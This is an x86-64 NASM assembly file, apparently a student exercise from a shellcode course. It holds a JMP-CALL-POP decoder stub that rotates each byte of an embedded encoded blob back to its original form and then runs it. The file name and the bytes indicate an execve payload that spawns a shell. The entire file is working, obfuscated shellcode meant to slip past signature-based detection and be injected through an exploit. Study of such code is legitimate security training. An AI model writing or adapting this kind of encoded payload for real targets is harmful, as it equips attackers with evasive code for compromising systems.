;-------------------------------
; decoder-execve.nasm
; by Michael Born (@blu3gl0w13)
; November 8, 2016
; Student ID: SLAE64-1439
;-------------------------------

global _start

section .text


_start:

	; JMP CALL POP
	; to get address of our
	; encoded shellcode

	jmp shellcode


decoder:
	pop rsi
	xor rcx, rcx
	mov cl, shellLen
	xor rdx, rdx	
decode:
	mov dl, byte [rsi]
	rol dl, 0x2
	mov byte [rsi], dl
	inc rsi
	loop decode
	jmp short encShellcode
	
	
shellcode:

	call decoder
	encShellcode: db  0x12,0x4c,0x30,0x14,0x12,0xee,0xcb,0x98,0x5a,0x9b,0xcb,0xcb,0xdc,0x1a,0xd4,0x12,0x62,0xf9,0x14,0x12,0x62,0xb8,0xd5,0x12,0x62,0xb9,0x12,0xe0,0x30,0xce,0xc3,0x41
	shellLen: equ $-encShellcode
